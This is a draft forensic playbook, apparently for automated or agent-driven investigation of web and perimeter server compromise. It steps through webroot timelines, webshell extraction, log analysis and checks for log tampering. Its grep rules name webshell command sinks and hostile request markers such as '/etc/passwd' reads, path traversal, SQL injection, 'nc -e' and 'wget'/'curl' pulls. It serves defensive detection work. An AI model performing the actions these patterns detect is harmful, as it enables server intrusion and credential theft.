---
attack_type: web-server-compromise
category_id: web-server-compromise
name: Web / Perimeter & Server Compromise
description: an internet-facing web or perimeter server is breached — webshell, exploited service, defacement
version: 1
os_coverage: [windows, linux, macos, cloud]
sub_types_covered: 5
sub_types:
  - webshell-drop
  - exploited-service-rce
  - web-defacement
  - server-log-tampering
  - perimeter-device-compromise
validated_on: []
maturity: draft
variables:
  image_path:
    default: UNSET-bind-in-step-0
    derive: "Step 0 — first disk-evidence image (E01/dd/raw/vmdk) enumerated under the evidence directory named in the case brief"
  mount_root:
    default: UNSET-bind-in-step-0
    derive: "Step 0 — directory where the file system is mounted READ-ONLY (or where icat-extracted webroot/log artifacts land when mounting fails)"
  case_out:
    default: UNSET-bind-in-step-0
    derive: "Step 0 — writable case output directory from the case brief; Step 0 creates #{case_out}/receipts/ and #{case_out}/extracted/"
  ntfs_offset_sectors:
    default: 0
    derive: "Step 0 — start sector of the relevant partition from `mmls #{image_path}` (largest NTFS/ext partition holding the webroot unless the brief says otherwise)"
  time_window:
    default: whole-image-until-step-pins-one
    derive: "case brief if it names one; else the first confirmed malicious request/upload timestamp ±48h once a step pins one — then re-scope wide log sweeps to it"
---

## In one line
Someone reached a server you exposed to the internet — a website, VPN box, mail gateway, or firewall — and broke in through it: they dropped a hidden "webshell" (a script that lets them run commands by visiting a URL), abused a bug in the server software to run code, vandalized the public page (defacement), or quietly edited the server's own logs to erase their tracks.

## Use this when (triggers)
- The web/access logs show odd POSTs or GETs to a script that shouldn't exist (e.g. a `.php`/`.aspx`/`.jsp` in an uploads or images folder), or one URL hit thousands of times from a few IPs.
- A new or recently-modified script file appeared inside the webroot (the folder the web server publishes), especially one whose contents are obfuscated/base64 or call `eval`, `system`, `exec`, `cmd.exe`, `/bin/sh`.
- The public home page was replaced with attacker text/imagery (defacement), or the site redirects somewhere unexpected.
- The web server process (`w3wp.exe`, `httpd`/`apache2`, `nginx`, `java`/Tomcat) spawned a shell or `whoami`/`net user`/`certutil`/`curl` — a web app should not be launching a command prompt.
- Access logs have a gap, are truncated, are missing days, or the perimeter device (firewall/VPN/load-balancer) lost its config or has unexplained admin sessions.

## Quick path (the 90% case)
1. **Timeline-first.** Build a quick file-system timeline of the webroot and the log directory (`fls -m` → `mactime`, or `MFTECmd` on `$MFT` sorted by time, or `log2timeline.py` + `psort.py` scoped to `#{time_window}`) so you anchor the story to *when files changed* before trusting any single log line.
2. **Read the web logs for the entry request.** Parse the Apache/nginx/IIS access logs (`log2timeline.py` web parsers, or `bstrings`/`srch_strings`/`grep`); look for the suspicious POST that *created* the script, then the GETs/POSTs that *use* it. `iisGeolocate` maps the source IPs.
3. **Find and read the webshell.** Locate new/odd scripts in the webroot (`fls`, `icat` to extract), confirm maliciousness with `pe-scanner`/`page-brute` (yara-python) and `bstrings`/`srch_strings` (look for `eval`, `base64_decode`, `system`, `passthru`, `cmd /c`).
4. **Tie the webshell to command execution.** Correlate the script's request times with what the web user ran on the host (`EvtxECmd` Security 4688 under the `IIS APPPOOL`/`apache` identity on Windows; shell history / `auth.log` on Linux).
5. **Check for log tampering and defacement.** Compare access-log continuity against the `$MFT`/`$UsnJrnl` (or ext journal) record of the log file; check whether `index.html`/default page was overwritten near the entry time.

If one source IP, one dropped script, an execution under the web identity, and a webroot change all line up on one timeline → you have the thread. Quick-path success does **not** close the case — the close-gate invariant below still applies in full.

## How it unfolds (the story)
An attacker scans the internet for your exposed server and finds a way in: a known CVE in the web app / VPN / mail appliance, a weak admin password, a file-upload that doesn't check what it accepts, or an injection flaw. They use it to write a small script into a web-served folder (the webshell) or to run code directly in the server process. From then on they "live" inside the trusted web process — browsing to their URL to run commands, add accounts, pull more tools, deface the page, or pivot deeper into the network. Before leaving they often trim or rewrite the very logs that recorded them.

## Theories to test (and how to rule each out)
| Theory (who / why) | If true, you'd find… | Rule it out if… |
|---|---|---|
| **External-commodity (mass scanner / automated webshell)** — botnet sprays a public exploit | One CVE-shaped request from many rotating IPs; a generic public webshell (c99/WSO/China Chopper signature); little hands-on follow-up | No exploit-shaped request; the access came via a valid admin credential, not an unauthenticated bug |
| **External-targeted (hands-on intruder)** — specific actor exploits then operates manually | A single dropped script then a *human* rhythm of commands (recon → cred theft → lateral) over time; custom/renamed shell; cleanup of logs | Only automated identical requests, no interactive follow-up, no host commands under the web identity |
| **Insider (admin/dev abusing legitimate access)** — places a "shell" using real creds | Script written by an authenticated session from an internal/known IP; no exploit precursor; uses an existing admin account | The write was unauthenticated or rode an exploit request; source IP is external/unknown and matches no admin baseline |
| **Supply-chain (poisoned plugin / dependency / appliance update)** — malicious code arrives via trusted update | Malicious code inside a vendor plugin/theme or an appliance firmware/package update; same artifact across hosts; signed-but-trojaned component | Code arrived as a single attacker-written file via a request to this host only; no updater/package parent |
| **Innocent / benign (NOT an attack)** — a legitimate admin script, a scanner/pentest, a CMS plugin, or a misconfigured page | A "shell-looking" file that is a known admin tool/CMS component; scary requests that are authorized vuln-scan traffic; defaced-looking page that is a staging/test deploy | A genuine unauthenticated drop + obfuscated payload + command execution under the web identity → benign cause refuted |

*(≥1 benign + ≥1 malicious, each actively refuted. Map every attacker type: insider · other-insider · external-commodity · external-targeted · supply-chain · innocent.)*

## Evidence → Tool → What it reveals (per OS)
| Evidence | SIFT tool | What it tells you *for this attack* | OS |
|---|---|---|---|
| IIS logs (`%SystemDrive%\inetpub\logs\LogFiles\W3SVC*`) | `iisGeolocate`, `bstrings`, `log2timeline.py`+`psort.py` | The exploit/upload request, the webshell GET/POST pattern, and **geolocated source IPs** → entry request + actor IPs | Windows |
| Apache/nginx access & error logs (`/var/log/apache2`, `/var/log/nginx`) | `log2timeline.py`+`psort.py`, `srch_strings`, `bstrings` | Same: the malicious POST that wrote the shell, the requests that drive it, user-agents, referrers → **request timeline** | Linux |
| Webroot script files (`.php`/`.aspx`/`.jsp`/`.ashx`) | `fls`/`icat`, `pe-scanner`, `page-brute`, `bstrings`/`srch_strings` | A planted webshell: obfuscation, `eval`/`system`/`passthru`/`cmd` calls, china-chopper/WSO/c99 markers → **webshell artifact + IOC** | all |
| `$MFT` / `$UsnJrnl:$J` | `MFTECmd`, `analyzeMFT`, `usn.py`/`usnjls` | When the script appeared, by which process; whether log files were truncated/recreated → **drop time + log-tamper proof** | Windows |
| ext3/4 metadata + journal | `fls`/`fsstat`/`mactime`, `jls` | Webroot/log file creation & modification ordering on Linux (no MFT/USN) → **drop time + tamper timeline** | Linux |
| `Security.evtx` (4688 process creation, 4624/4625 logons) | `EvtxECmd`, `evtxexport` | The web pool identity spawning `cmd`/`powershell`/`whoami`/`certutil`; admin account creation; remote logons | Windows |
| Shell history / `auth.log` / `wtmp` | `srch_strings`, `bstrings`, `fls`/`icat` | Commands the web user ran; SSH "Accepted" entries; sudo to root after the web foothold | Linux |
| Registry hives (SOFTWARE/SYSTEM/NTUSER) | `RECmd`, `rip.pl` | Persistence (Run keys, Services 7045), tooling the operator ran (UserAssist/BAM) | Windows |
| Public page / default document | `fls`/`icat`, `srch_strings`, `exiftool` | Defacement content, attacker tag/handle, embedded author metadata | all |
| Captured pcap (if present in evidence) | `tcpdump`, `tcpflow`, `ngrep` | Reconstructs the HTTP request/response carrying the shell or exploit (only when a pcap is in evidence) | all |
| Whole image (FS-independent) | `bulk_extractor` | URLs, IPs, emails, and onion addresses scattered across disk/unallocated → leads even after deletion | all |
| Dropped PE / tooling | `pe-carver`, `densityscout`, `clamscan` | Second-stage binary pulled in by the shell; packed/known-bad triage | Windows/Linux |
| Super-timeline | `log2timeline.py`+`psort.py` | One fused chronology fusing web logs + file system + event logs | all |

*(every "reveals" is specific to web/perimeter compromise; `pe-scanner`/`page-brute` use the yara-python library — there is no `yara` CLI on this box; pcap tools apply only when a pcap is in evidence.)*

## Step 0 — evidence inventory & access bootstrap
- n: 0
  tool: |
    mkdir -p "#{case_out}/receipts" "#{case_out}/extracted" && ls -laR "#{image_path%/*}" 2>&1 | tee "#{case_out}/receipts/00.txt" && img_stat "#{image_path}" 2>&1 | tee -a "#{case_out}/receipts/00.txt" && mmls "#{image_path}" 2>&1 | tee -a "#{case_out}/receipts/00.txt" && fsstat -o #{ntfs_offset_sectors} "#{image_path}" 2>&1 | tee -a "#{case_out}/receipts/00.txt"
  expect: every evidence file classified (disk image · pcap · log export · webroot copy); #{image_path}, #{mount_root}, #{ntfs_offset_sectors}, #{case_out} bound; read-only access proven and OS family (NTFS vs ext) noted from fsstat
  check: |
    test -r "#{mount_root}" -o -n "$(ls "#{case_out}/extracted" 2>/dev/null)" && test -s "#{case_out}/receipts/00.txt"
  falsify: evidence dir empty/unreadable, or no supported image format (mmls/fsstat both error and no extractable artifacts)
  on_result: {expect_met: goto 1, falsify_met: STOP — report acquisition/access failure; pivot acquisition-custody, neither: try ewfmount then loop-mount read-only; if that fails icat-extract the webroot+log paths into #{case_out}/extracted and treat that as access}
  emits: [key_artifacts]
  serves: [webshell-drop, exploited-service-rce, web-defacement, server-log-tampering, perimeter-device-compromise]
  provenance: {receipt_id: 00, artifact: evidence directory listing, offset_or_row: full listing + mmls/fsstat header, literal_cited: image filename + File System Type line}

## Steps (executable — decision-driven)
- n: 1
  precondition: "exists #{case_out}/receipts/00.txt"
  tool: |
    fls -r -m C: -o #{ntfs_offset_sectors} "#{image_path}" > "#{case_out}/extracted/body.txt" 2>>"#{case_out}/receipts/01.txt" && mactime -b "#{case_out}/extracted/body.txt" -d > "#{case_out}/extracted/timeline.csv" 2>>"#{case_out}/receipts/01.txt" && grep -Ei "/(inetpub|wwwroot|www|html|htdocs|webapps)/.*\.(php|asp|aspx|ashx|jsp|jspx|cfm)$" "#{case_out}/extracted/timeline.csv" | tee -a "#{case_out}/receipts/01.txt"
  expect: a webroot timeline exists; one or more server-side script files were created/modified inside #{time_window} that do not match the application's install/update baseline → candidate drop time
  check: |
    grep -Eiq "/(inetpub|wwwroot|www|html|htdocs|webapps)/.*\.(php|asp|aspx|ashx|jsp|jspx|cfm)" "#{case_out}/receipts/01.txt"
  falsify: no script files created/modified in the webroot in the window; all scripts match the app's shipped fileset and install date
  on_result: {expect_met: record candidate file + birth time then goto 2, falsify_met: webshell-drop unlikely — goto 3 to test exploited-service-RCE / defacement instead, neither: widen with log2timeline.py over the image and re-scope #{time_window}; if still empty pivot disk-filesystem for a deeper MFT/INDX pass}
  emits: [timeline_events, key_artifacts]
  serves: [webshell-drop]
  provenance: {receipt_id: 01, artifact: file-system timeline, offset_or_row: mactime row for the candidate script, literal_cited: candidate script path + birth timestamp}

- n: 2
  precondition: "exists #{case_out}/extracted/timeline.csv"
  tool: |
    for ic in $(grep -Eio "[0-9]+(-[0-9]+-[0-9]+)?" "#{case_out}/receipts/01.txt" | sort -u | head -20); do icat -o #{ntfs_offset_sectors} "#{image_path}" "$ic" > "#{case_out}/extracted/cand_$ic" 2>/dev/null; done; for f in "#{case_out}/extracted"/cand_*; do echo "== $f =="; srch_strings "$f" | grep -Ei "eval\(|base64_decode|gzinflate|system\(|passthru|shell_exec|proc_open|cmd(\.exe)?( |/c)|/bin/(ba)?sh|Request\[|FromBase64String|china.?chopper|WSO|c99" ; done | tee "#{case_out}/receipts/02.txt"
  expect: at least one extracted candidate contains webshell markers (obfuscation `eval/base64_decode/gzinflate`, command sinks `system/passthru/shell_exec`, or known-shell tags WSO/c99/China-Chopper) → confirmed webshell + IOC strings
  check: |
    grep -Eiq "eval\(|base64_decode|gzinflate|system\(|passthru|shell_exec|proc_open|cmd|/bin/(ba)?sh|china.?chopper|WSO|c99" "#{case_out}/receipts/02.txt"
  falsify: every candidate is plain, structured application code with no obfuscation and no command/exec sink — not a shell
  on_result: {expect_met: record webshell path + literal marker string as IOC then goto 4, falsify_met: no webshell in these files — goto 3 to test in-memory/exploited-service RCE, neither: rerun pe-scanner/page-brute (yara-python) on #{case_out}/extracted for deeper signatures then re-judge}
  emits: [key_iocs, key_artifacts]
  serves: [webshell-drop]
  provenance: {receipt_id: 02, artifact: extracted candidate script, offset_or_row: srch_strings hit line, literal_cited: the verbatim webshell marker (e.g. eval(base64_decode(...)))}

- n: 3
  precondition: "test -r #{mount_root} -o -n \"$(ls #{case_out}/extracted 2>/dev/null)\""
  tool: |
    { find "#{mount_root}" -path "*inetpub/logs/LogFiles*" -o -path "*W3SVC*" -o -path "*logs/access*" 2>/dev/null; ls "#{case_out}/extracted" 2>/dev/null; } | tee "#{case_out}/receipts/03.txt"; for lg in $(grep -Ei "u_ex|access|W3SVC|\.log" "#{case_out}/receipts/03.txt"); do srch_strings "$lg" 2>/dev/null; done | grep -Ei "POST .*(\.php|\.asp|\.aspx|\.ashx|\.jsp|upload|cmd=|exec=)|\.\./|%2e%2e|select.*from|union.*select|/cgi-bin/|/etc/passwd|whoami|certutil|powershell" | tee -a "#{case_out}/receipts/03.txt"
  expect: an access/error log line shows the exploit-shaped or upload request (path traversal `../`/`%2e%2e`, SQLi `union select`, a POST to the dropped script, or a CVE-shaped CGI request) with a source IP and timestamp inside #{time_window} → entry request for exploited-service-RCE
  check: |
    grep -Eiq "POST .*(\.php|\.asp|\.aspx|\.ashx|\.jsp)|\.\./|%2e%2e|union.*select|/cgi-bin/|/etc/passwd|whoami|certutil|powershell" "#{case_out}/receipts/03.txt"
  falsify: logs present but show only normal traffic — no exploit-shaped request, no POST to an unexpected script, no traversal/injection markers
  on_result: {expect_met: record source IP + request line + timestamp then goto 4, falsify_met: no server-side exploit evidence — goto 6 to test defacement then the log-tampering check at 7 (logs may have been edited), neither: the relevant log window may be missing/rotated — go to 7 (log tampering) before concluding benign}
  emits: [key_iocs, timeline_events]
  serves: [exploited-service-rce]
  provenance: {receipt_id: 03, artifact: web access/error log, offset_or_row: the request log line, literal_cited: method + URL + source IP + timestamp}

- n: 4
  precondition: "os == windows"
  tool: |
    dotnet /opt/zimmermantools/EvtxeCmd/EvtxECmd.dll -f "#{mount_root}/Windows/System32/winevt/Logs/Security.evtx" --csv "#{case_out}" --csvf sec4688.csv 2>&1 | tee "#{case_out}/receipts/04.txt"; grep -Ei "4688" "#{case_out}/sec4688.csv" 2>/dev/null | grep -Ei "IIS APPPOOL|DefaultAppPool|w3wp|httpd|apache|nginx|tomcat|java" | grep -Ei "cmd\.exe|powershell|whoami|net( |\.exe)|certutil|bitsadmin|curl|wget|reg( |\.exe)|nslookup" | tee -a "#{case_out}/receipts/04.txt"
  expect: a 4688 process-creation event where the parent/identity is the web pool (`IIS APPPOOL\*`, `w3wp.exe`, or the apache/tomcat service account) and the child is a shell/recon binary (`cmd.exe`,`powershell`,`whoami`,`net.exe`,`certutil`) launched within minutes of the webshell requests → command execution under the web identity
  check: |
    grep -Eiq "cmd|powershell|whoami|certutil|bitsadmin|net|curl|wget|reg|nslookup" "#{case_out}/receipts/04.txt"
  falsify: no 4688 under any web identity (process auditing off, or the foothold never reached host command execution)
  on_result: {expect_met: confirm interactive operation under the web account and record commands then goto 5, falsify_met: fall back to Amcache/timeline for execution traces; if process auditing was off record the gap and proceed to 5, neither: re-parse with evtxexport on the raw Security.evtx and grep the XML for 4688 around #{time_window}}
  emits: [actor_accounts, timeline_events]
  serves: [exploited-service-rce, webshell-drop]
  provenance: {receipt_id: 04, artifact: Security.evtx, offset_or_row: 4688 CSV row, literal_cited: parent web identity + child process command line}

- n: 5
  precondition: "exists #{case_out}/receipts/04.txt"
  tool: |
    dotnet /opt/zimmermantools/EvtxeCmd/EvtxECmd.dll -f "#{mount_root}/Windows/System32/winevt/Logs/Security.evtx" --csv "#{case_out}" --csvf logons.csv 2>&1 | tee "#{case_out}/receipts/05.txt"; grep -Ei ",4720,|,4724,|,4732,|,4624,.*(,3,|,10,)" "#{case_out}/logons.csv" 2>/dev/null | tee -a "#{case_out}/receipts/05.txt"; dotnet /opt/zimmermantools/RECmd/RECmd.dll --bn /opt/zimmermantools/RECmd/BatchExamples/Kroll_Batch.reb -d "#{mount_root}/Windows/System32/config" --csv "#{case_out}" --csvf persist.csv 2>&1 | tee -a "#{case_out}/receipts/05.txt"
  expect: post-foothold actor activity — a new local account (4720) / added to a group (4732), a 7045 service or Run-key persistence pointing at attacker tooling, or an interactive/remote logon (4624 type 3/10) consistent with the operator pivoting from the web foothold → actor accounts + persistence
  check: |
    grep -Eiq "4720|4724|4732|4624|Run|Services|7045" "#{case_out}/receipts/05.txt"
  falsify: no new accounts, no group changes, no persistence keys/services tied to the foothold time — likely a smash-and-grab or pure defacement with no deeper foothold
  on_result: {expect_met: record actor account(s) + persistence as IOCs then goto 6, falsify_met: note "no deeper foothold/persistence found" then goto 6, neither: run rip.pl -r on SYSTEM (services) and SOFTWARE (run) hives and re-check}
  emits: [actor_accounts, key_artifacts]
  serves: [exploited-service-rce, perimeter-device-compromise]
  provenance: {receipt_id: 05, artifact: Security.evtx + registry hives, offset_or_row: 4720/7045 row or Run-key value, literal_cited: new account name or persistence ImagePath}

- n: 6
  tool: |
    for page in $(find "#{mount_root}" \( -path "*wwwroot/index*" -o -path "*html/index*" -o -path "*htdocs/index*" -o -name "default.htm*" -o -name "index.htm*" \) 2>/dev/null); do echo "== $page =="; srch_strings "$page" 2>/dev/null | grep -Ei "hacked by|defaced|owned by|pwned|h4ck|your site|greetz|<title>"; done | tee "#{case_out}/receipts/06.txt"; for page in $(grep -Eo "== .* ==" "#{case_out}/receipts/06.txt" | tr -d '= '); do exiftool "$page" 2>/dev/null; done | tee -a "#{case_out}/receipts/06.txt"
  expect: the public/default page was overwritten near the entry time with attacker text (handle, "hacked by", "greetz") or an unexpected redirect/iframe; exiftool may reveal an embedded author/handle → defacement artifact + actor tag
  check: |
    grep -Eiq "hacked by|defaced|owned by|pwned|h4ck|greetz" "#{case_out}/receipts/06.txt"
  falsify: the index/default page matches the legitimate site content and its modify time predates the incident — no defacement
  on_result: {expect_met: record defacement content + handle as IOC then goto 7, falsify_met: no defacement — goto 7 to verify whether logs were tampered to hide the activity, neither: carve unallocated for a prior/overwritten page copy with photorec/foremost then goto 7}
  emits: [key_artifacts, key_iocs]
  serves: [web-defacement]
  provenance: {receipt_id: 06, artifact: web index/default page, offset_or_row: srch_strings hit + exiftool field, literal_cited: defacement string or embedded handle}

- n: 7
  tool: |
    dotnet /opt/zimmermantools/MFTECmd.dll -f "#{mount_root}/\$Extend/\$UsnJrnl:\$J" --csv "#{case_out}" --csvf usnj.csv 2>&1 | tee "#{case_out}/receipts/07.txt"; grep -Ei "u_ex|access\.log|error\.log|W3SVC|inetpub.*\.log" "#{case_out}/usnj.csv" 2>/dev/null | grep -Ei "Overwrite|FileDelete|RenameNewName|DataTruncation|FileCreate" | tee -a "#{case_out}/receipts/07.txt"; fls -r -o #{ntfs_offset_sectors} "#{image_path}" 2>/dev/null | grep -Ei "u_ex|access\.log|\.log" | tee -a "#{case_out}/receipts/07.txt"
  expect: the change journal shows the access/error log being deleted, truncated, or recreated near the incident (a log file with a birth time AFTER the events it should contain, or a delete/overwrite of `u_ex*.log`/`access.log`) → server-log tampering proof; OR the log line count/date range has an unexplained gap across the entry window
  check: |
    grep -Eiq "Overwrite|FileDelete|RenameNewName|DataTruncation|access\.log|u_ex|\.log" "#{case_out}/receipts/07.txt"
  falsify: log files are continuous across the entry window, their birth times predate the incident, and the journal shows no delete/truncate/recreate of any log
  on_result: {expect_met: record log-tampering as a FINDING (absence/edit is itself evidence) then goto 8, falsify_met: note "logs intact — no tampering observed" then goto 8, neither: recover prior log content from unallocated/journal (usn.py / tsk_recover) and compare then goto 8}
  emits: [timeline_events, key_artifacts]
  serves: [server-log-tampering]
  provenance: {receipt_id: 07, artifact: $UsnJrnl:$J + $MFT log entries, offset_or_row: usnj.csv row for the log file, literal_cited: log filename + Overwrite/FileDelete reason + timestamp}

- n: 8
  tool: |
    log2timeline.py --partitions all "#{case_out}/case.plaso" "#{image_path}" 2>&1 | tee "#{case_out}/receipts/08.txt"; psort.py -o l2tcsv "#{case_out}/case.plaso" > "#{case_out}/extracted/super.csv" 2>>"#{case_out}/receipts/08.txt"; iisGeolocate -d "#{mount_root}" --csv "#{case_out}" 2>&1 | tee -a "#{case_out}/receipts/08.txt"; bulk_extractor -o "#{case_out}/be" "#{image_path}" 2>&1 | tee -a "#{case_out}/receipts/08.txt"
  expect: a fused super-timeline orders entry-request(R03) → webshell drop(R01/R02) → command execution(R04/R05) → defacement(R06) → log edit(R07) with no impossible ordering; iisGeolocate attributes the source IPs; bulk_extractor surfaces the same IPs/URLs in unallocated → corroborated, geolocated actor
  check: |
    test -s "#{case_out}/extracted/super.csv"
  falsify: the ordering is impossible (e.g. webshell requests predate the file's creation) or there is an unexplained multi-hour gap that breaks the entry→action→impact chain
  on_result: {expect_met: COMMIT the story with confidence labels then follow the Pivots graph on the strongest onward lead, falsify_met: re-open the Theories table — a contradiction means a wrong assumption or planted artifact, neither: run pinfo.py on case.plaso to confirm the web-log parsers ran then re-filter to #{time_window}}
  emits: [timeline_events, key_iocs, actor_accounts]
  serves: [exploited-service-rce, webshell-drop, web-defacement, server-log-tampering, perimeter-device-compromise]
  provenance: {receipt_id: 08, artifact: case.plaso super-timeline + iisGeolocate output, offset_or_row: super.csv ordered rows, literal_cited: ordered chain entry→shell→exec→impact with source IP}

## Linux branch (L1..Ln) — same step shape
- n: L1
  precondition: "os == linux"
  tool: |
    fls -r -m / -o #{ntfs_offset_sectors} "#{image_path}" > "#{case_out}/extracted/lbody.txt" 2>>"#{case_out}/receipts/L01.txt" && mactime -b "#{case_out}/extracted/lbody.txt" -d > "#{case_out}/extracted/ltimeline.csv" 2>>"#{case_out}/receipts/L01.txt" && grep -Ei "/(var/www|html|htdocs|webapps|public_html)/.*\.(php|jsp|jspx|cgi|pl|py|sh|war)$" "#{case_out}/extracted/ltimeline.csv" | tee -a "#{case_out}/receipts/L01.txt"
  expect: a Linux webroot timeline; one or more server-side scripts created/modified in #{time_window} under `/var/www`, `public_html`, or a Tomcat `webapps` dir that don't match the package/install baseline → candidate webshell drop on Linux
  check: |
    grep -Eiq "/(var/www|html|htdocs|webapps|public_html)/.*\.(php|jsp|jspx|cgi|pl|py|sh|war)" "#{case_out}/receipts/L01.txt"
  falsify: no new server-side scripts in the window; all webroot files match the distro package manifest and install date
  on_result: {expect_met: record candidate path + birth time then goto L2, falsify_met: webshell-drop unlikely on Linux — goto L2 to read access logs for exploited-service RCE, neither: widen with log2timeline.py over the ext partition and re-scope #{time_window}; if still empty pivot disk-filesystem}
  emits: [timeline_events, key_artifacts]
  serves: [webshell-drop]
  provenance: {receipt_id: L01, artifact: ext file-system timeline, offset_or_row: mactime row for the candidate script, literal_cited: candidate script path + birth timestamp}

- n: L2
  precondition: "os == linux"
  tool: |
    for d in apache2 nginx httpd; do for lf in access.log error.log access_log error_log; do icat -o #{ntfs_offset_sectors} "#{image_path}" "$(ifind -n "/var/log/$d/$lf" -o #{ntfs_offset_sectors} "#{image_path}" 2>/dev/null)" 2>/dev/null; done; done > "#{case_out}/extracted/weblogs.txt" 2>>"#{case_out}/receipts/L02.txt"; grep -Ei "POST .*(\.php|\.jsp|upload|cmd=|c=)|\.\./|%2e%2e|union.*select|/cgi-bin/|/etc/passwd|wget |curl |chmod \+x|nc -e" "#{case_out}/extracted/weblogs.txt" | tee -a "#{case_out}/receipts/L02.txt"
  expect: an Apache/nginx access/error log line shows the exploit or upload request (traversal, SQLi, a POST to the dropped script, a CGI/`/etc/passwd` read, or a `wget`/`curl` pull of a second stage) with a source IP and timestamp in #{time_window} → entry request on Linux
  check: |
    grep -Eiq "POST .*(\.php|\.jsp|upload)|\.\./|%2e%2e|union.*select|/cgi-bin/|/etc/passwd|wget|curl|nc -e" "#{case_out}/receipts/L02.txt"
  falsify: logs present but only normal traffic — no exploit-shaped request and no POST to an unexpected script
  on_result: {expect_met: record source IP + request line + timestamp then goto L3, falsify_met: no server-side exploit evidence — goto L3 to check command execution / log tampering directly, neither: relevant log may be rotated/deleted — check the ext journal (jls) and unallocated before concluding benign}
  emits: [key_iocs, timeline_events]
  serves: [exploited-service-rce]
  provenance: {receipt_id: L02, artifact: Apache/nginx access/error log, offset_or_row: the request log line, literal_cited: method + URL + source IP + timestamp}

- n: L3
  precondition: "os == linux"
  tool: |
    for h in "root/.bash_history" "home/*/.bash_history" "var/log/auth.log" "var/log/secure" "var/log/wtmp"; do icat -o #{ntfs_offset_sectors} "#{image_path}" "$(ifind -n "/$h" -o #{ntfs_offset_sectors} "#{image_path}" 2>/dev/null)" 2>/dev/null; done > "#{case_out}/extracted/lhost.txt" 2>>"#{case_out}/receipts/L03.txt"; grep -Ei "Accepted (password|publickey)|sudo:.*COMMAND|useradd|adduser|chmod \+x|wget |curl |/bin/(ba)?sh|crontab|systemctl enable|nc " "#{case_out}/extracted/lhost.txt" | tee -a "#{case_out}/receipts/L03.txt"; jls -o #{ntfs_offset_sectors} "#{image_path}" 2>/dev/null | tail -40 | tee -a "#{case_out}/receipts/L03.txt"
  expect: shell history / auth.log shows commands run by the web user (`www-data`) or a privilege escalation to root after the foothold (`sudo`, `useradd`, `crontab`, `systemctl enable` for persistence, a `wget`/`curl` second-stage pull); the ext journal shows recent webroot/log file ops → execution + persistence + possible log tampering on Linux
  check: |
    grep -Eiq "Accepted (password|publickey)|sudo|useradd|adduser|chmod|wget|curl|/bin/(ba)?sh|crontab|systemctl|nc " "#{case_out}/receipts/L03.txt"
  falsify: no host commands tied to the web user, no privilege escalation, no persistence, and the journal shows no log/webroot tampering — foothold did not progress
  on_result: {expect_met: record actor commands + accounts + persistence as IOCs; build the fused timeline (reuse Step 8 log2timeline.py over the ext partition) then COMMIT or pivot, falsify_met: note "no deeper foothold on Linux"; still build the timeline and check for log tampering before closing, neither: recover deleted history/logs from unallocated (tsk_recover) and re-check; if logs are missing record the gap as a server-log-tampering finding}
  emits: [actor_accounts, timeline_events]
  serves: [exploited-service-rce, server-log-tampering, perimeter-device-compromise]
  provenance: {receipt_id: L03, artifact: shell history + auth.log + ext journal, offset_or_row: history/auth line + jls entry, literal_cited: the verbatim command or "Accepted password for <user> from <IP>"}

## Corroboration (two-source rule)
`required_sources: 2`
`pairs:`
- `[ Webroot script birth time (R01/L01) ↔ access-log POST that created it (R03/L02) ]`
- `[ Webshell marker strings (R02) ↔ pe-scanner/page-brute yara-python signature (R02) ]`
- `[ Webshell request times (R03) ↔ 4688 execution under the web identity (R04) / shell history (L03) ]`
- `[ Defacement page content (R06) ↔ access-log write/PUT + file modify time (R03/R07) ]`
- `[ Log-tamper journal entry (R07) ↔ a coverage gap in the parsed access log itself (R03) ]`
- `[ Source IP in web log (R03) ↔ iisGeolocate attribution + bulk_extractor unallocated hit (R08) ]`

One source is a *lead*; promote it to a *fact* only when its paired source agrees.

## Don't get fooled (red flags & anti-forensics)
- **Trimmed / rotated / missing access logs:** a log file whose birth time is AFTER the events it should hold, a `u_ex*.log`/`access.log` deleted-then-recreated in `$UsnJrnl`/ext journal, or a date gap across the entry window — the silence is itself the finding (T1070), not "nothing happened."
- **Timestomped webshell:** the script's `$SI` times made to look old/normal — compare `$SI` vs `$FN` with `istat`/`MFTECmd`, and trust the `$UsnJrnl`/journal create order over file timestamps.
- **Webshell hidden in plain sight:** named like a real app file (`license.php`, `wp-load.php`), tucked in an uploads/cache/temp dir, or appended to an existing legitimate script — diff against the app's shipped fileset/hashes, don't trust the filename.
- **Log poisoning makes the shell invisible in the file system:** the payload lived in a request the server *logged*, then was `include()`-d — look for the exploit in the log content even when no new file appears.
- **"Defacement" that's benign:** a staging/test page or an authorized maintenance notice — confirm via the modify time, the source of the write, and whether the change was authorized before calling it an attack.
- **Renamed/encrypted C2 over HTTPS:** a pcap may show only TLS — you can confirm *that* a channel exists (`tcpdump`/`tcpflow`/`ngrep`) but not its plaintext; say so rather than overclaim.
- **No `yara` CLI on this box:** signature scans run through `pe-scanner`/`page-brute` (yara-python) — never claim a bare `yara` run.

## Failure modes
```
- mode: evidence-access failure — image won't mount (unsupported/encrypted FS, bad offset) so no webroot/logs are reachable
  guard: Step 0 fallback chain — ewfmount → loop-mount RO → icat-extract the webroot+log paths into #{case_out}/extracted; if all fail, STOP and pivot acquisition-custody
- mode: primary-artifact-absent — access logs were rotated/deleted or the webshell file was removed before imaging
  guard: record the absence as a finding (T1070); recover from unallocated/journal (tsk_recover, usn.py, jls) and lean on $MFT/ext-journal birth times + bulk_extractor unallocated URL/IP hits
- mode: tool-output drift — EvtxECmd/MFTECmd/log2timeline CSV column or label changes break a check literal, or a check exits 2
  guard: on check exit 2, adjudicate from the prose expect/falsify against the receipt and cap confidence at `inferred`; cross-read the raw artifact (evtxexport XML, srch_strings on the log) before concluding
- mode: process auditing disabled — no Security 4688, so host command execution under the web identity is invisible
  guard: record the gap; fall back to Amcache/timeline and Linux shell-history/auth.log; never infer execution from presence alone
- mode: encrypted or proprietary perimeter-appliance image (firewall/VPN) the box can't parse
  guard: ⚠️verify — extract only what is readable (config/log text via srch_strings/bstrings), state the limitation, and treat findings as lead-only
```

## Confidence labeling (observation → inference → conclusion)
- **confirmed:** direct receipt verbatim + ≥2 independent paired sources agree + no unrefuted counter-theory (e.g. webroot drop time + access-log POST + execution under the web identity all align).
- **inferred:** grounded but single-source/interpretive (incl. every `check`-exit-2 adjudication) — e.g. Amcache shows the operator tool on disk (presence, not execution), or a webshell string match without a corroborating log → hedge and tag `⚠️verify`.
- **insufficient_evidence:** precondition unmet (no logs, process auditing off, appliance image unparseable) or sources conflict → abstain; state what is missing, do not guess.

<!-- BEGIN CLOSE-GATE INVARIANT — copy this block into every playbook VERBATIM, including these markers. Do not edit, summarize, or reflow; the linter byte-compares it against _TEMPLATE.md. -->
## Close-gate invariant (Done = may not be declared until ALL are true)
